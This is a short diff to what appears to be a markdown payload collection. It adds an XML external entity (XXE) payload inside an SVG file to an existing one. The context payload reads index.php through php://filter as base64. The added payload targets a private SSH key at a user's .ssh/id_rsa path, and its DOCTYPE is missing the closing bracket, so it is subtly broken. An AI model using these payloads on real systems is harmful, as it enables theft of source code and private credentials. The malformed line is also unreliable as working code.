@@ -763,6 +763,10 @@ done
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <svg>&xxe;</svg>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=c:/users/daniel/.ssh/id_rsa">
+<svg>&xxe;</svg>
 ```
 
 ---
